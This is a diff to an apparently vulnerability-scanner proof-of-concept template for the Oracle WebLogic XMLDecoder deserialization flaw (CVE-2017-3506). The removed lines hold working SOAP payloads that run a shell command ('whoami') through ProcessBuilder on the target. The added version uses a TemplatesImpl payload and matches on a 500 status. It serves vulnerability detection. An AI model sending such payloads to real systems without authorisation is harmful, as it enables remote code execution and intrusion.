@@ -1,98 +1,35 @@
 [info]
-author = "AVE"
-description = "通过向 /wls-wsat/CoordinatorPortType 发送特制 XMLDecoder 反序列化载荷，检测目标 WebLogic Server 是否存在 CVE-2017-3506 漏洞。若返回包含 java.lang.ProcessBuilder 的 fault 信息，则判定存在漏洞。"
+author = "ave"
+description = "Detects Oracle WebLogic Server XMLDecoder deserialization vulnerability via wls-wsat endpoint"
 id = "POC-AVE-2017-0668"
-name = "Oracle WebLogic Server XMLDecoder 反序列化漏洞 PoC"
-severity = "high"
-tags = ["ave-2017-0668"]
+name = "PoC for AVE-2017-0668"
+severity = "medium"
+tags = [
+    "cve-2017-3506",
+    "weblogic",
+    "deserialization",
+]
 vuln_id = [
-    "CVE-2017-3506",
     "AVE-2017-0668",
+    "CVE-2017-3506",
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
 method = "POST"
-path = "/{{BaseURL}}/wls-wsat/CoordinatorPortType"
+path = "/wls-wsat/CoordinatorPortType"
 protocol = "http"
 
 [poc.requests.body]
-content = """
-<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
-  <soapenv:Header>
-    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
-      <java>
-        <object class="java.lang.ProcessBuilder">
-          <array class="java.lang.String" length="3">
-            <void index="0">
-              <string>/bin/bash</string>
-            </void>
-            <void index="1">
-              <string>-c</string>
-            </void>
-            <void index="2">
-              <string>whoami</string>
-            </void>
-          </array>
-          <void method="start"/>
-        </object>
-      </java>
-    </work:WorkContext>
-  </soapenv:Header>
-  <soapenv:Body/>
-</soapenv:Envelope>"""
+content = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><void class="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"><void property="transletBytecodes"><array class="byte[]" length="1"><void index="0"><string></string></void></array></void></void></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>'
 type = "raw"
 
 [poc.requests.headers]
-Content-Type = "text/xml;charset=UTF-8"
-User-Agent = "AVE/1.0"
+Content-Type = "text/xml"
 
 [[poc.requests.matchers]]
 expect = true
-part = "body"
-type = "word"
-words = ["java.lang.ProcessBuilder"]
-
-[[poc.requests]]
-method = "POST"
-path = "/{{BaseURL}}/wls-wsat/RegistrationRequesterPortType"
-protocol = "http"
-
-[poc.requests.body]
-content = """
-<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
-  <soapenv:Header>
-    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
-      <java>
-        <object class="java.lang.ProcessBuilder">
-          <array class="java.lang.String" length="3">
-            <void index="0">
-              <string>/bin/bash</string>
-            </void>
-            <void index="1">
-              <string>-c</string>
-            </void>
-            <void index="2">
-              <string>whoami</string>
-            </void>
-          </array>
-          <void method="start"/>
-        </object>
-      </java>
-    </work:WorkContext>
-  </soapenv:Header>
-  <soapenv:Body/>
-</soapenv:Envelope>"""
-type = "raw"
-
-[poc.requests.headers]
-Content-Type = "text/xml;charset=UTF-8"
-User-Agent = "AVE/1.0"
-
-[[poc.requests.matchers]]
-expect = true
-part = "body"
-type = "word"
-words = ["java.lang.ProcessBuilder"]
+status = [500]
+type = "status"
